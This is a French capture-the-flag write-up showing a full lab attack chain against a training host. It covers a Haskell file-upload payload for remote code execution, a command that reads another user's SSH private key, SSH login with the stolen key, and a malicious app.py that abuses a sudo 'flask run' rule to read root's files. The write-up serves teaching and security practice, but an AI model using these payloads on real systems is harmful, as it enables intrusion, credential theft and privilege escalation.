# Write-up : "Fun With Functional #2" (Privilege Escalation vers root)

**Cible :** 10.10.0.43

**Difficulté :** Easy

**Date :** 16/09/2026

**Objectif :** root.txt

**Techniques utilisées :** Upload de fichier malveillant, exécution de code arbitraire (RCE), énumération post-exploitation, vol de clé SSH, escalade de privilèges via sudo

**Outils utilisés :** curl, ssh

> Ce challenge est la suite directe de "Fun With Functional". Le point d'entrée (upload Haskell -> exécution de code en tant que `www-data`) est identique. Ce write-up se concentre sur l'étape supplémentaire : passer de `www-data` à `root`.

---

## 1. Confirmation du point d'entrée déjà connu

Comme sur le premier challenge, le serveur web (port 5001) accepte l'upload d'un fichier Haskell (`.hs`), le compile avec GHC, puis exécute le résultat. On réutilise directement le payload RCE :

```bash
cat > exploit.hs << 'EOF'
import System.Process
main :: IO ()
main = do
    putStrLn "I love Haskell"
    output <- readProcess "id" [] ""
    putStrLn output
EOF

curl -s -X POST http://10.10.0.43:5001/homework -F "file=@exploit.hs"
curl -s http://10.10.0.43:5001/uploads/exploit.hs
```

**Résultat :** confirmation d'une exécution de commande en tant que `uid=33(www-data)`.

---

## 2. Reconnaissance du système en tant que www-data

Avec l'exécution de commande, on explore le système à la recherche d'un chemin d'escalade.

**Ce que fait cette commande :** on utilise `readProcessWithExitCode` (plutôt que `readProcess`) car cette variante capture aussi bien la sortie normale que les erreurs, même quand la commande échoue (`readProcess` seul provoque une exception Haskell non gérée si le code de sortie n'est pas 0, ce qui empêche de voir le résultat).

```bash
cat > exploit.hs << 'EOF'
import System.Process
main :: IO ()
main = do
    putStrLn "I love Haskell"
    (_, out, err) <- readProcessWithExitCode "bash" ["-c", "ps aux; echo ---; ls -la /home/prof/.ssh"] ""
    putStrLn out
    putStrLn err
EOF

curl -s -X POST http://10.10.0.43:5001/homework -F "file=@exploit.hs"
curl -s http://10.10.0.43:5001/uploads/exploit.hs
```

**Découvertes clés :**

1. La liste des processus (`ps aux`) montre que le serveur Flask lui-même est lancé par root via `sudo -u www-data python3 /var/www/html/app.py` - comportement normal de démarrage, pas exploitable directement.
2. Le dossier `/home/prof/.ssh` contient une clé privée SSH (`id_rsa`) lisible par tout le monde (permissions `rw-r--r--` au lieu de `rw-------` attendu). C'est une mauvaise configuration classique : une clé privée SSH ne devrait jamais être lisible par un autre utilisateur que son propriétaire.

---

## 3. Vol de la clé privée SSH et pivot vers l'utilisateur `prof`

**Faille exploitée :** Permissions de fichier trop permissives sur une clé privée (CWE-276 : Incorrect Default Permissions). N'importe quel utilisateur du système (ici `www-data`, via notre RCE) peut lire cette clé privée et s'en servir pour se connecter à la place de son propriétaire légitime.

### Récupération de la clé

```bash
cat > exploit.hs << 'EOF'
import System.Process
main :: IO ()
main = do
    putStrLn "I love Haskell"
    output <- readProcess "cat" ["/home/prof/.ssh/id_rsa"] ""
    putStrLn output
EOF

curl -s -X POST http://10.10.0.43:5001/homework -F "file=@exploit.hs"
curl -s http://10.10.0.43:5001/uploads/exploit.hs
```

Le contenu complet de la clé privée RSA s'affiche dans la réponse.

### Utilisation de la clé pour se connecter en SSH

On sauvegarde la clé récupérée dans un fichier local, en lui donnant les permissions strictes que SSH exige (`chmod 600` - sinon SSH refuse de l'utiliser, la considérant comme non sécurisée) :

```bash
cat > prof_key << 'EOF'
-----BEGIN RSA PRIVATE KEY-----
[... contenu de la clé récupérée ...]
-----END RSA PRIVATE KEY-----
EOF

chmod 600 prof_key
ssh -i prof_key prof@10.10.0.43
```

**Résultat :** connexion SSH interactive réussie en tant qu'utilisateur `prof`.

---

## 4. Escalade de privilèges de prof vers root

Une fois connecté en tant que `prof`, on vérifie ses droits d'exécution en tant que root :

```bash
sudo -l
```

**Résultat :**

```
User prof may run the following commands on lambda:
    (root) NOPASSWD: /usr/local/bin/flask run
```

**Explication :** cette règle sudo autorise `prof` à exécuter la commande exacte `/usr/local/bin/flask run` en tant que root, sans avoir besoin de mot de passe (`NOPASSWD`). `flask` est l'outil en ligne de commande du framework web Flask ; sa sous-commande `run` démarre un serveur web à partir d'une application Python. Le problème : Flask a besoin de savoir quel fichier Python charger comme application, et cette information peut être fournie de plusieurs façons, dont une que la règle sudo ne bloque pas.

**Faille exploitée :** Détournement de binaire autorisé via sudo (Sudo Privilege Escalation / GTFOBins-style). La règle sudo n'autorise que la commande `flask run` sans arguments supplémentaires (ajouter `--app monfichier.py` change la ligne de commande et sudo la refuse). Mais Flask a une convention par défaut : s'il ne reçoit aucune indication explicite, il cherche automatiquement un fichier nommé `app.py` dans le dossier courant. Cette convention permet de contourner la restriction : on place notre propre fichier malveillant nommé exactement `app.py` dans le dossier où l'on exécute la commande, et Flask (donc root) le charge et l'exécute sans qu'on ait eu besoin de modifier la ligne de commande autorisée par sudo.

### Création du fichier Python malveillant

**Explication du code :** quand Python importe/charge un fichier, tout le code écrit au niveau supérieur (pas dans une fonction) s'exécute immédiatement, avant même que Flask ne démarre son serveur web. On profite de ce moment pour :

- lire le fichier `/root/root.txt` (normalement inaccessible à `prof`) et copier son contenu dans `/tmp/root_flag.txt`, un emplacement qu'on pourra relire ensuite en tant que `prof`.
- rendre ce fichier de sortie lisible par tous (`chmod 644`), puisqu'il vient d'être créé par root et serait sinon inaccessible à `prof`.
- le reste du fichier (la partie Flask) n'est là que pour que le fichier reste un minimum valide et ne fasse pas planter la commande `flask run`.

```bash
cat > /tmp/evil.py << 'EOF'
import os
os.system("cat /root/root.txt > /tmp/root_flag.txt")
os.system("chmod 644 /tmp/root_flag.txt")

from flask import Flask
app = Flask(__name__)

@app.route('/')
def home():
    return "pwned"
EOF
```

### Placement du fichier et exécution

Dès que la commande se lance, Flask charge automatiquement `app.py` depuis le dossier courant (`/home/prof`), exécutant notre code malveillant avec les pleins droits root, avant même que le serveur web ne démarre réellement.

```bash
cp /tmp/evil.py /home/prof/app.py
cd /home/prof
sudo /usr/local/bin/flask run &
sleep 3
```

### Récupération du flag

```bash
cat /tmp/root_flag.txt
```

Le contenu de `/root/root.txt` s'affiche : c'est le flag final recherché.

```
EPI{TODO_remplacer_par_le_flag_reellement_obtenu}
```

---

## Résumé des failles exploitées

| #   | Faille                                         | Type / Catégorie                             | Explication courte                                                                                                                                                           |
| --- | ---------------------------------------------- | -------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | Upload et exécution de code Haskell arbitraire | Unrestricted Upload / RCE (CWE-434)          | Point d'entrée initial, obtention d'un shell en tant que `www-data`                                                                                                          |
| 2   | Clé SSH privée lisible par tout le monde       | Incorrect Default Permissions (CWE-276)      | Permet de voler l'identité de l'utilisateur `prof` sans connaître son mot de passe                                                                                           |
| 3   | Règle sudo trop permissive sur `flask run`     | Sudo Misconfiguration / Privilege Escalation | La convention de chargement par défaut de Flask (`app.py` dans le dossier courant) permet d'exécuter du code arbitraire en root sans modifier la ligne de commande autorisée |

---

## Chaîne d'exploitation complète (résumé visuel)

```
Upload fichier .hs malveillant
        |
        v
Exécution de commande en tant que www-data
        |
        v
Lecture de la clé SSH privée de "prof" (permissions trop ouvertes)
        |
        v
Connexion SSH en tant que "prof" avec la clé volée
        |
        v
sudo -l révèle : NOPASSWD sur "flask run"
        |
        v
Dépôt d'un app.py malveillant dans le dossier courant
        |
        v
"sudo flask run" exécute notre code en tant que root
        |
        v
Lecture de /root/root.txt (flag final)
```

---

## Conclusion

- **Accès initial :** RCE via upload de fichier Haskell non sandboxé → shell en tant que `www-data`.
- **Pivot :** vol d'une clé SSH privée mal protégée → accès `prof`.
- **Escalade de privilèges :** détournement de la règle sudo `NOPASSWD: flask run` via la convention de chargement `app.py` de Flask → exécution de code en root.
- **Flag root :** obtenu dans `/root/root.txt`.

---

## Evidences

### Flag user.txt

![Flag user.txt](Evidences/Reconnaissance%20du%20systeme.png)

### Flag

![Flag](Evidences/Flag%20fun%20with%20fonctional%202.png)
